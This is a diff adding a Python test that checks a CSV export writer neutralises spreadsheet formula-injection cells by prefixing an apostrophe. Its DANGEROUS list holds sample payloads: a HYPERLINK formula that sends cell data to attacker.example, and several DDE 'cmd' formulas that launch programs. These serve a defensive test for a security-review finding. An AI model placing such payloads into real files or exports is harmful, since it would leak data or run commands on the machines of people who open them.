@@ -249,3 +249,45 @@ async def test_two_holders_sharing_one_writer_cannot_interleave_a_spool(tmp_path
     assert await w.finish_partition("j_z", 0, batch_no=0) == {"files": []}  # an empty partition
     await w.close()
     assert not (tmp_path / "spool").exists() or not any((tmp_path / "spool").iterdir())
+
+
+DANGEROUS = [
+    '=HYPERLINK("http://attacker.example/?"&A1,"open me")',
+    "=cmd|'/c calc'!A1",
+    "@SUM(1+1)*cmd|'/c calc'!A0",
+    "+cmd|'/c calc'!A0",
+    "-2+3+cmd|'/c calc'!A0",
+    "\t=1+1",
+    "\r=1+1",
+]
+HARMLESS = ["+1 (555) 010-0100", "-12.50", "plain", "a=b", "", "+44 20 7946 0958"]
+
+
+async def test_csv_cells_a_spreadsheet_would_evaluate_are_neutralised(tmp_path: Path) -> None:
+    """S3 review F-07 (S9 for the bulk export): a kept text column copied verbatim into a CSV part
+    file must not run as a formula when an analyst opens it. Text cells starting with ``=`` ``@``
+    TAB/CR, or ``+``/``-`` followed by anything but a number or phone shape, get a leading
+    apostrophe; numbers, dates and phone-like text are written as they are."""
+    cols = [
+        ColumnInfo(path="$.id", name="id", data_type="bigint", kind="int"),
+        ColumnInfo(path="$.note", name="note", data_type="text", kind="text"),
+        ColumnInfo(path="$.amount", name="amount", data_type="numeric", kind="decimal"),
+    ]
+    values = DANGEROUS + HARMLESS
+    rows = [{"id": -i, "note": v, "amount": Decimal(f"-{i}.25")} for i, v in enumerate(values)]
+    store = LocalObjectStore(tmp_path / "out")
+    w = FilesWriter(
+        store,
+        FilesSpec(format="csv", compression="none", prefix="crm"),  # type: ignore[arg-type]
+        job_id="j_f",
+        base_prefix="exports",
+        columns=cols,
+        spool_root=tmp_path / "spool",
+    )
+    assert await w.write_batch(rows, mark=MARK) == len(rows)
+    [part] = (await w.finish_partition("j_f", 0))["files"]
+    read = list(csv.DictReader(io.StringIO((await store.get(part["key"])).decode())))
+    notes = [r["note"] for r in read]
+    assert notes[: len(DANGEROUS)] == ["'" + v for v in DANGEROUS]
+    assert notes[len(DANGEROUS) :] == HARMLESS
+    assert [r["id"] for r in read][1] == "-1" and read[1]["amount"] == "-1.25"  # numbers untouched
